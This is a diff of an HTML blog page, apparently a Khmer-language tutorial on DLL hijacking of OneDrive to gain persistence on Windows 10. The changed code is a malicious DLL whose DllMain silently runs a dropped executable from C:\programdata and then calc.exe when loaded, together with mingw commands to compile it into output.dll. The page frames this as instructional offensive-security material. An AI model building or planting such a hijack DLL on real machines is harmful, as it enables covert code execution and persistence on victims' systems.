@@ -1779,12 +1779,22 @@
 </span><span class="lnt">14
 </span><span class="lnt">15
 </span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="n">WinExec</span><span class="p">(</span><span class="s">&#34;cmd.exe /c c:</span><span class="se">\\</span><span class="s">programdata</span><span class="se">\\</span><span class="s">putty.exe&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec1</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">WinExec</span><span class="p">(</span><span class="s">&#34;cmd.exe /c C:</span><span class="se">\\</span><span class="s">programdata</span><span class="se">\\</span><span class="s">putty.exe&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec2</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">WinExec</span><span class="p">(</span><span class="s">&#34;cmd.exe /c calc.exe&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span>
 </span></span><span class="line"><span class="cl"><span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
@@ -1792,7 +1802,9 @@
 </span></span><span class="line"><span class="cl">	<span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">	<span class="p">{</span>
 </span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">			<span class="n">exec</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="n">exec1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="n">usleep</span><span class="p">(</span><span class="mi">5000000</span><span class="p">);</span> <span class="c1">//5sec
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">exec2</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">		<span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
@@ -1814,14 +1826,14 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// To create Windows executables, you need to instsall mingw cross-compiler
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">// To create Windows executables, you need to instsall mingw cross-compiler
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">mingw</span><span class="o">-</span><span class="n">w64</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">//For x64 compile with: 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">x86_64</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span> <span class="n">r4t</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span><span class="p">.</span><span class="n">dll</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">x86_64</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span> <span class="n">r4t</span><span class="p">.</span><span class="n">cpp</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span><span class="p">.</span><span class="n">dll</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">//For x86 compile with: 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">i686</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span> <span class="n">r4t</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span><span class="p">.</span><span class="n">dll</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">i686</span><span class="o">-</span><span class="n">w64</span><span class="o">-</span><span class="n">mingw32</span><span class="o">-</span><span class="n">gcc</span> <span class="n">r4t</span><span class="p">.</span><span class="n">cpp</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span><span class="p">.</span><span class="n">dll</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <h4 id="get-persistence-in-windows-10">Get Persistence In Windows 10</h4>
@@ -1853,7 +1865,8 @@
 </span></span><span class="line"><span class="cl">cmd.exe /c onedrive.exe</span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><b>ឯកសារយោង៖</b> <a href="https://www.youtube.com/watch?v=3eROsG_WNpE">ippsec</a></p>
+<p><b>ឯកសារយោង៖</b> <a href="https://www.youtube.com/watch?v=3eROsG_WNpE">ippsec</a><br />
+<b>អានផងដែរ៖</b> <a href="https://ain-kun.medium.com/dll-hijacking-onedrive-73f06ce102ce">ain-kun.medium</a></p>
 
     </article>
     
